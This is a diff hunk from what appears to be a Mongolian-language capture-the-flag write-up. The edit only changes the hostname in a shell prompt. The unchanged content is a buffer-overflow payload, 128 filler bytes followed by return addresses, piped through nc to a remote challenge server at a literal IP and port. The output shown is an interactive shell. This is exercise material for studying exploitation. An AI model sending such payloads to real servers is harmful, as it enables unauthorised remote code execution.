@@ -163,7 +163,7 @@ Hurray! ажиллаж байна.
 одоо бид flag авахын тулд сервер рүү хүсэлтийг явуулна. 
 
 ```
-[root@HZ1-dashboard home]# (python -c 'print "A"*128 + "BBBB"+"\x90\x83\x04\x08" + "DUMM"+ "\x24\x86\x04\x08"'; cat )| nc 218.100.84.106 9006
+[root@reamb home]# (python -c 'print "A"*128 + "BBBB"+"\x90\x83\x04\x08" + "DUMM"+ "\x24\x86\x04\x08"'; cat )| nc 218.100.84.106 9006
 [+] Feed me more!!!
 ls
 chall
